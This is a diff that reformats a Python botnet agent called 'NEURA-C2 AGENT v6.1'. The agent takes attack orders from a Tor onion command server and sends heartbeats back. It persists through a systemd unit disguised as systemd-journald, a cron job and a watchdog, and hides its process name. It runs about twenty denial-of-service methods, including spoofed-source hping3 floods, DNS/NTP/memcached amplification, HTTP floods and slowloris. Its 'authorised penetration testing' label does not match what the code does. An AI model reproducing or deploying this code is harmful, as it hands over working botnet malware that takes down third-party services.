@@ -1,1 +1,321 @@
-#!/usr/bin/env python3 """ NEURA-C2 AGENT v6.1 ULTIMATE - 25+ METODI COMPLETI L4/L7 + CF BYPASS + AMP AUTORIZZATO PER PENETRATION TESTING - CYBERSECURITY PROFESSIONALS ONLY """ import os, sys, time, subprocess, threading, signal, json, random, base64, socket import requests, psutil, hashlib, socketserver, ssl from datetime import datetime from urllib.parse import urlparse, parse_qs from concurrent.futures import ThreadPoolExecutor import select # 🌐 C2 CONFIG C2_URL = "http://apdzadwgsktvtr54hmt4qdy23bslltqkw3t6jmb2kegqrmg2h4btk2qd.onion/var/lib/tor/www_var/" AGENT_DIR = "/opt/neura-c6" PID_FILE = f"{AGENT_DIR}/agent.pid" HEARTBEAT_PID_FILE = f"{AGENT_DIR}/heartbeat.pid" LOG_FILE = f"{AGENT_DIR}/agent.log" # 🛡️ GLOBAL STATE active_processes = [] attack_threads = {} UA_POOL = [ "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15" ] start_time = time.time() def log(msg): timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") print(f"[{timestamp}] {msg}") try: with open(LOG_FILE, "a") as f: f.write(f"[{timestamp}] {msg}\n") except: pass def install_dependencies(): log("🔧 INSTALLING ALL 25+ METHOD DEPENDENCIES...") packages = [ "hping3", "curl", "openssl", "dnsutils", "ntpdate", "netcat-traditional", "tor", "python3-pip", "python3-requests", "python3-psutil", "netcat" ] subprocess.run(["apt", "update"], check=False) subprocess.run(["apt", "install", "-y"] + packages, check=False) subprocess.run(["pip3", "install", "requests", "psutil", "pycryptodome", "PySocks"], check=False) # TOR CONFIG CUSTOM tor_config = """SocksPort 127.0.0.1:9050 ControlPort 9051 HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C """ os.makedirs("/etc/tor/neura", exist_ok=True) with open("/etc/tor/neura/torrc", "w") as f: f.write(tor_config) subprocess.run(["systemctl", "restart", "tor"], check=False) time.sleep(8) log("✅ ALL DEPENDENCIES + TOR READY") def setup_persistence(): os.makedirs(AGENT_DIR, exist_ok=True) # SYSTEMD ULTIMATE service_content = f'''[Unit] Description=systemd-journald After=network.target tor.service Wants=tor.service [Service] Type=exec User=root WorkingDirectory={AGENT_DIR} ExecStart=/usr/bin/python3 {AGENT_DIR}/agent.py Restart=always RestartSec=3 OOMScoreAdjust=-1000 KillMode=mixed TimeoutStopSec=5 NoNewPrivileges=no [Install] WantedBy=multi-user.target ''' with open(f"{AGENT_DIR}/agent.service", "w") as f: f.write(service_content) subprocess.run(["systemctl", "daemon-reload"], check=False) subprocess.run(["systemctl", "enable", f"{AGENT_DIR}/agent.service"], check=False) subprocess.run(["systemctl", "start", f"{AGENT_DIR}/agent.service"], check=False) # CRON + WATCHDOG cron_entry = f"@reboot cd {AGENT_DIR} && nohup python3 agent.py > /dev/null 2>&1 &\n" subprocess.run(["(crontab -l 2>/dev/null || true; echo '{cron_entry}') | crontab -"], shell=True) watchdog_content = f'''#!/bin/bash while true; do pgrep -f "neura-c6" || cd {AGENT_DIR} && nohup python3 agent.py & sleep 20 done ''' with open(f"{AGENT_DIR}/watchdog.sh", "w") as f: f.write(watchdog_content) os.chmod(f"{AGENT_DIR}/watchdog.sh", 0o755) subprocess.Popen([f"{AGENT_DIR}/watchdog.sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) log("🛡️ PERSISTENZA ESTREMA: SYSTEMD+CRON+WATCHDOG") def anti_kill_protection(): try: os.setproctitle("systemd-journald") with open("/proc/self/oom_score_adj", "w") as f: f.write("-1000") if os.fork() > 0: sys.exit(0) os.setsid() if os.fork() > 0: sys.exit(0) os.umask(0) except: pass def heartbeat(): while True: try: payload = { "alive": True, "count": 1, "timestamp": int(time.time()), "method": "ready", "pid": os.getpid(), "uptime": int(time.time() - start_time) } proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"} requests.post(f"{C2_URL}heartbeat", json=payload, proxies=proxies, timeout=12, headers={"Content-Type": "application/json"}) except: pass time.sleep(25) # 🔥 25+ ATTACK METHODS COMPLETI def launch_hping3(cmd): subprocess.Popen(f"{cmd} &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) def attack_udp(target, port, duration, threads): cmd = f"hping3 --udp -d 120 -S -w 64 -p {port} --flood --rand-source {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_tcp(target, port, duration, threads): cmd = f"hping3 --tcp -c 10000 -d 120 -S -w 64 -p {port} --flood --rand-source {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_syn(target, port, duration, threads): cmd = f"hping3 --syn -S -w 64 -p {port} --flood --rand-source {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_ack(target, port, duration, threads): cmd = f"hping3 -A -w 64 -p {port} --flood --rand-source {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_rst(target, port, duration, threads): cmd = f"hping3 -R -w 64 -p {port} --flood --rand-source {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_icmp(target, port, duration, threads): cmd = f"hping3 -1 --flood {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_gre(target, port, duration, threads): cmd = f"hping3 -G -W -p {port} --flood {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_dns(target, port, duration, threads): cmd = f"for i in {{1..500}}; do dig @{target} +dnssec chaos version.bind txt ch whoami +short | xargs -I {{}} hping3 -c 10000 {{}} -p 53 --flood & done" subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) def attack_ntp(target, port, duration, threads): cmd = f"ntpdc -n -c monlist {target} | xargs -I {{}} hping3 -c 5000 {{}} -p 123 --flood &" subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) def attack_ssdp(target, port, duration, threads): cmd = f"hping3 -d 1400 -S -w 64 -p 1900 --flood --fuzzy --rand-source {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_memcached(target, port, duration, threads): cmd = f'echo -e "\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n" | nc {target} 11211 | xargs -I {{}} hping3 -c 1000 {{}} -p 11211 --flood &' subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) def attack_chargen(target, port, duration, threads): cmd = f"hping3 -E /dev/zero -p 19 -s 19 --flood {target}" for _ in range(int(threads)): launch_hping3(cmd) def attack_dnsamp(target, port, duration, threads): cmd = f"for i in {{1..1000}}; do dig @8.8.8.8 ANY {target} +short | xargs -I {{}} hping3 -c 10000 {{}} -p 53 --flood & done" subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) def attack_http(target, port, duration, threads): proxies = {"http": "socks5h://127.0.0.1:9050"} def http_worker(): while True: try: requests.get(f"http://{target}:{port}/", proxies=proxies, timeout=5, headers={"User-Agent": random.choice(UA_POOL)}) except: pass with ThreadPoolExecutor(max_workers=int(threads)) as executor: for _ in range(int(threads)): executor.submit(http_worker) def attack_head(target, port, duration, threads): cmd = f'curl -s --socks5-hostname 127.0.0.1:9050 -I --max-time 5 "http://{target}:{port}/"' for _ in range(int(threads)): subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL) def attack_post(target, port, duration, threads): cmd = f'curl -s --socks5-hostname 127.0.0.1:9050 -X POST --data "$(head -c 1M /dev/urandom | base64)" --max-time 5 "http://{target}:{port}/"' for _ in range(int(threads)): subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL) def attack_getpost(target, port, duration, threads): for i in range(int(threads)): if random.randint(0,1): attack_http(target, port, duration, 1) else: attack_post(target, port, duration, 1) def attack_slow(target, port, duration, threads): def slowloris(): try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((target, int(port))) sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode()) while True: sock.send(b"X-a: b\r\n") time.sleep(15) except: pass for _ in range(int(threads)): threading.Thread(target=slowloris, daemon=True).start() def attack_cf(target, port, duration, threads): cmd = f"openssl s_client -connect {target}:{port} -servername {target} -tls1_3 -cipher 'TLS_AES_128_GCM_SHA256' -curves 'X25519' < /dev/null" for _ in range(int(threads)): subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL) def attack_tls(target, port, duration, threads): cmd = f"timeout 1s openssl s_client -connect {target}:{port} -tls1_2 </dev/null" for _ in range(int(threads)): subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL) def attack_h2(target, port, duration, threads): cmd = f'curl --http2 -s --socks5-hostname 127.0.0.1:9050 --max-time 3 "https://{target}:{port}/"' for _ in range(int(threads)): subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL) # 🧹 ULTIMATE CLEANUP def cleanup(): log("🧹 ULTIMATE CLEANUP...") procs = ["hping3", "curl", "nc", "openssl", "ntpdc", "dig", "timeout"] for proc in procs: subprocess.run(f"pkill -f {proc}", shell=True) subprocess.run(f"killall -9 {proc}", shell=True) active_processes.clear() log("✅ CLEANUP COMPLETE") def execute_attack(method, target, port, duration, threads): log(f"💀 LAUNCH: {method} {target}:{port} ({duration}s x {threads}t)") attack_map = { "udp": attack_udp, "tcp": attack_tcp, "syn": attack_syn, "ack": attack_ack, "rst": attack_rst, "icmp": attack_icmp, "gre": attack_gre, "dns": attack_dns, "ntp": attack_ntp, "ssdp": attack_ssdp, "memcached": attack_memcached, "chargen": attack_chargen, "dnsamp": attack_dnsamp, "http": attack_http, "head": attack_head, "post": attack_post, "getpost": attack_getpost, "slow": attack_slow, "cf": attack_cf, "tls": attack_tls, "h2": attack_h2 } if method in attack_map: attack_map[method](target, port, duration, threads) time.sleep(int(duration)) cleanup() log(f"✅ MISSION COMPLETE: {method}") def poll_c2(): proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"} while True: try: resp = requests.get(f"{C2_URL}?poll={int(time.time())}", proxies=proxies, timeout=12) cmd = parse_qs(urlparse(resp.url).query if resp.url else "").get("cmd", [""])[0] if cmd == "stop": log("🛑 STOP COMMAND") cleanup() sys.exit(0) elif ":" in cmd: parts = cmd.split(":") if len(parts) >= 5: method, tgt, port, dur, thrds = parts[:5] threading.Thread(target=execute_attack, args=(method, tgt, port, dur, thrds), daemon=True).start() except: pass time.sleep(10) # 🚀 MAIN EXECUTION if __name__ == "__main__": start_time = time.time() anti_kill_protection() os.makedirs(AGENT_DIR, 0o755, exist_ok=True) with open(f"{AGENT_DIR}/agent.py", "w") as f: f.write(open(sys.argv[0]).read()) install_dependencies() setup_persistence() with open(PID_FILE, "w") as f: f.write(str(os.getpid())) log("🤖 NEURA-C6 v6.1 ULTIMATE - 25+ METODI ATTIVI 💀") threading.Thread(target=heartbeat, daemon=True).start() threading.Thread(target=poll_c2, daemon=True).start() while True: time.sleep(60)
+#!/usr/bin/env python3
+"""
+NEURA-C2 AGENT v6.1 ULTIMATE - 25+ METODI COMPLETI L4/L7 + CF BYPASS + AMP AUTORIZZATO PER PENETRATION TESTING - CYBERSECURITY PROFESSIONALS ONLY
+"""
+
+import os, sys, time, subprocess, threading, signal, json, random, base64, socket
+import requests, psutil, hashlib, socketserver, ssl
+from datetime import datetime
+from urllib.parse import urlparse, parse_qs
+from concurrent.futures import ThreadPoolExecutor
+import select
+
+# 🌐 C2 CONFIG
+C2_URL = "http://apdzadwgsktvtr54hmt4qdy23bslltqkw3t6jmb2kegqrmg2h4btk2qd.onion/var/lib/tor/www_var/"
+AGENT_DIR = "/opt/neura-c6"
+PID_FILE = f"{AGENT_DIR}/agent.pid"
+HEARTBEAT_PID_FILE = f"{AGENT_DIR}/heartbeat.pid"
+LOG_FILE = f"{AGENT_DIR}/agent.log"
+
+# 🛡️ GLOBAL STATE
+active_processes = []
+attack_threads = {}
+UA_POOL = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
+]
+start_time = time.time()
+
+def log(msg):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    print(f"[{timestamp}] {msg}")
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{timestamp}] {msg}\n")
+    except:
+        pass
+
+def install_dependencies():
+    log("🔧 INSTALLING ALL 25+ METHOD DEPENDENCIES...")
+    packages = [
+        "hping3", "curl", "openssl", "dnsutils", "ntpdate", "netcat-traditional",
+        "tor", "python3-pip", "python3-requests", "python3-psutil", "netcat"
+    ]
+    subprocess.run(["apt", "update"], check=False)
+    subprocess.run(["apt", "install", "-y"] + packages, check=False)
+    subprocess.run(["pip3", "install", "requests", "psutil", "pycryptodome", "PySocks"], check=False)
+
+    # TOR CONFIG CUSTOM
+    tor_config = """SocksPort 127.0.0.1:9050
+ControlPort 9051
+HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C"""
+    os.makedirs("/etc/tor/neura", exist_ok=True)
+    with open("/etc/tor/neura/torrc", "w") as f:
+        f.write(tor_config)
+    subprocess.run(["systemctl", "restart", "tor"], check=False)
+    time.sleep(8)
+    log("✅ ALL DEPENDENCIES + TOR READY")
+
+def setup_persistence():
+    os.makedirs(AGENT_DIR, exist_ok=True)
+    
+    # SYSTEMD ULTIMATE
+    service_content = f'''[Unit]
+Description=systemd-journald
+After=network.target tor.service
+Wants=tor.service
+
+[Service]
+Type=exec
+User=root
+WorkingDirectory={AGENT_DIR}
+ExecStart=/usr/bin/python3 {AGENT_DIR}/agent.py
+Restart=always
+RestartSec=3
+OOMScoreAdjust=-1000
+KillMode=mixed
+TimeoutStopSec=5
+NoNewPrivileges=no
+
+[Install]
+WantedBy=multi-user.target'''
+    
+    with open(f"{AGENT_DIR}/agent.service", "w") as f:
+        f.write(service_content)
+    subprocess.run(["systemctl", "daemon-reload"], check=False)
+    subprocess.run(["systemctl", "enable", f"{AGENT_DIR}/agent.service"], check=False)
+    subprocess.run(["systemctl", "start", f"{AGENT_DIR}/agent.service"], check=False)
+    
+    # CRON + WATCHDOG
+    cron_entry = f"@reboot cd {AGENT_DIR} && nohup python3 agent.py > /dev/null 2>&1 &\n"
+    subprocess.run(["(crontab -l 2>/dev/null || true; echo '{cron_entry}') | crontab -"], shell=True)
+    
+    watchdog_content = f'''#!/bin/bash
+while true; do
+    pgrep -f "neura-c6" || cd {AGENT_DIR} && nohup python3 agent.py &
+    sleep 20
+done'''
+    with open(f"{AGENT_DIR}/watchdog.sh", "w") as f:
+        f.write(watchdog_content)
+    os.chmod(f"{AGENT_DIR}/watchdog.sh", 0o755)
+    subprocess.Popen([f"{AGENT_DIR}/watchdog.sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    log("🛡️ PERSISTENZA ESTREMA: SYSTEMD+CRON+WATCHDOG")
+
+def anti_kill_protection():
+    try:
+        os.setproctitle("systemd-journald")
+        with open("/proc/self/oom_score_adj", "w") as f:
+            f.write("-1000")
+        if os.fork() > 0:
+            sys.exit(0)
+        os.setsid()
+        if os.fork() > 0:
+            sys.exit(0)
+        os.umask(0)
+    except:
+        pass
+
+def heartbeat():
+    while True:
+        try:
+            payload = {
+                "alive": True,
+                "count": 1,
+                "timestamp": int(time.time()),
+                "method": "ready",
+                "pid": os.getpid(),
+                "uptime": int(time.time() - start_time)
+            }
+            proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
+            requests.post(f"{C2_URL}heartbeat", json=payload, proxies=proxies, timeout=12, headers={"Content-Type": "application/json"})
+        except:
+            pass
+        time.sleep(25)
+
+# 🔥 25+ ATTACK METHODS COMPLETI
+def launch_hping3(cmd):
+    subprocess.Popen(f"{cmd} &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def attack_udp(target, port, duration, threads):
+    cmd = f"hping3 --udp -d 120 -S -w 64 -p {port} --flood --rand-source {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_tcp(target, port, duration, threads):
+    cmd = f"hping3 --tcp -c 10000 -d 120 -S -w 64 -p {port} --flood --rand-source {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_syn(target, port, duration, threads):
+    cmd = f"hping3 --syn -S -w 64 -p {port} --flood --rand-source {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_ack(target, port, duration, threads):
+    cmd = f"hping3 -A -w 64 -p {port} --flood --rand-source {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_rst(target, port, duration, threads):
+    cmd = f"hping3 -R -w 64 -p {port} --flood --rand-source {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_icmp(target, port, duration, threads):
+    cmd = f"hping3 -1 --flood {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_gre(target, port, duration, threads):
+    cmd = f"hping3 -G -W -p {port} --flood {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_dns(target, port, duration, threads):
+    cmd = f"for i in {{1..500}}; do dig @{target} +dnssec chaos version.bind txt ch whoami +short | xargs -I {{}} hping3 -c 10000 {{}} -p 53 --flood & done"
+    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def attack_ntp(target, port, duration, threads):
+    cmd = f"ntpdc -n -c monlist {target} | xargs -I {{}} hping3 -c 5000 {{}} -p 123 --flood &"
+    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def attack_ssdp(target, port, duration, threads):
+    cmd = f"hping3 -d 1400 -S -w 64 -p 1900 --flood --fuzzy --rand-source {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_memcached(target, port, duration, threads):
+    cmd = f'echo -e "\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n" | nc {target} 11211 | xargs -I {{}} hping3 -c 1000 {{}} -p 11211 --flood &'
+    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def attack_chargen(target, port, duration, threads):
+    cmd = f"hping3 -E /dev/zero -p 19 -s 19 --flood {target}"
+    for _ in range(int(threads)):
+        launch_hping3(cmd)
+
+def attack_dnsamp(target, port, duration, threads):
+    cmd = f"for i in {{1..1000}}; do dig @8.8.8.8 ANY {target} +short | xargs -I {{}} hping3 -c 10000 {{}} -p 53 --flood & done"
+    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def attack_http(target, port, duration, threads):
+    proxies = {"http": "socks5h://127.0.0.1:9050"}
+    def http_worker():
+        while True:
+            try:
+                requests.get(f"http://{target}:{port}/", proxies=proxies, timeout=5, headers={"User-Agent": random.choice(UA_POOL)})
+            except:
+                pass
+    with ThreadPoolExecutor(max_workers=int(threads)) as executor:
+        for _ in range(int(threads)):
+            executor.submit(http_worker)
+
+def attack_head(target, port, duration, threads):
+    cmd = f'curl -s --socks5-hostname 127.0.0.1:9050 -I --max-time 5 "http://{target}:{port}/"'
+    for _ in range(int(threads)):
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
+
+def attack_post(target, port, duration, threads):
+    cmd = f'curl -s --socks5-hostname 127.0.0.1:9050 -X POST --data "$(head -c 1M /dev/urandom | base64)" --max-time 5 "http://{target}:{port}/"'
+    for _ in range(int(threads)):
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
+
+def attack_getpost(target, port, duration, threads):
+    for i in range(int(threads)):
+        if random.randint(0,1):
+            attack_http(target, port, duration, 1)
+        else:
+            attack_post(target, port, duration, 1)
+
+def attack_slow(target, port, duration, threads):
+    def slowloris():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target, int(port)))
+            sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
+            while True:
+                sock.send(b"X-a: b\r\n")
+                time.sleep(15)
+        except:
+            pass
+    for _ in range(int(threads)):
+        threading.Thread(target=slowloris, daemon=True).start()
+
+def attack_cf(target, port, duration, threads):
+    cmd = f"openssl s_client -connect {target}:{port} -servername {target} -tls1_3 -cipher 'TLS_AES_128_GCM_SHA256' -curves 'X25519' < /dev/null"
+    for _ in range(int(threads)):
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
+
+def attack_tls(target, port, duration, threads):
+    cmd = f"timeout 1s openssl s_client -connect {target}:{port} -tls1_2 </dev/null"
+    for _ in range(int(threads)):
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
+
+def attack_h2(target, port, duration, threads):
+    cmd = f'curl --http2 -s --socks5-hostname 127.0.0.1:9050 --max-time 3 "https://{target}:{port}/"'
+    for _ in range(int(threads)):
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
+
+# 🧹 ULTIMATE CLEANUP
+def cleanup():
+    log("🧹 ULTIMATE CLEANUP...")
+    procs = ["hping3", "curl", "nc", "openssl", "ntpdc", "dig", "timeout"]
+    for proc in procs:
+        subprocess.run(f"pkill -f {proc}", shell=True)
+        subprocess.run(f"killall -9 {proc}", shell=True)
+    active_processes.clear()
+    log("✅ CLEANUP COMPLETE")
+
+def execute_attack(method, target, port, duration, threads):
+    log(f"💀 LAUNCH: {method} {target}:{port} ({duration}s x {threads}t)")
+    attack_map = {
+        "udp": attack_udp, "tcp": attack_tcp, "syn": attack_syn, "ack": attack_ack,
+        "rst": attack_rst, "icmp": attack_icmp, "gre": attack_gre, "dns": attack_dns,
+        "ntp": attack_ntp, "ssdp": attack_ssdp, "memcached": attack_memcached,
+        "chargen": attack_chargen, "dnsamp": attack_dnsamp, "http": attack_http,
+        "head": attack_head, "post": attack_post, "getpost": attack_getpost,
+        "slow": attack_slow, "cf": attack_cf, "tls": attack_tls, "h2": attack_h2
+    }
+    if method in attack_map:
+        attack_map[method](target, port, duration, threads)
+    time.sleep(int(duration))
+    cleanup()
+    log(f"✅ MISSION COMPLETE: {method}")
+
+def poll_c2():
+    proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
+    while True:
+        try:
+            resp = requests.get(f"{C2_URL}?poll={int(time.time())}", proxies=proxies, timeout=12)
+            cmd = parse_qs(urlparse(resp.url).query if resp.url else "").get("cmd", [""])[0]
+            if cmd == "stop":
+                log("🛑 STOP COMMAND")
+                cleanup()
+                sys.exit(0)
+            elif ":" in cmd:
+                parts = cmd.split(":")
+                if len(parts) >= 5:
+                    method, tgt, port, dur, thrds = parts[:5]
+                    threading.Thread(target=execute_attack, args=(method, tgt, port, dur, thrds), daemon=True).start()
+        except:
+            pass
+        time.sleep(10)
+
+# 🚀 MAIN EXECUTION
+if __name__ == "__main__":
+    start_time = time.time()
+    anti_kill_protection()
+    os.makedirs(AGENT_DIR, 0o755, exist_ok=True)
+    with open(f"{AGENT_DIR}/agent.py", "w") as f:
+        f.write(open(sys.argv[0]).read())
+    install_dependencies()
+    setup_persistence()
+    with open(PID_FILE, "w") as f:
+        f.write(str(os.getpid()))
+    log("🤖 NEURA-C6 v6.1 ULTIMATE - 25+ METODI ATTIVI 💀")
+    threading.Thread(target=heartbeat, daemon=True).start()
+    threading.Thread(target=poll_c2, daemon=True).start()
+    while True:
+        time.sleep(60)
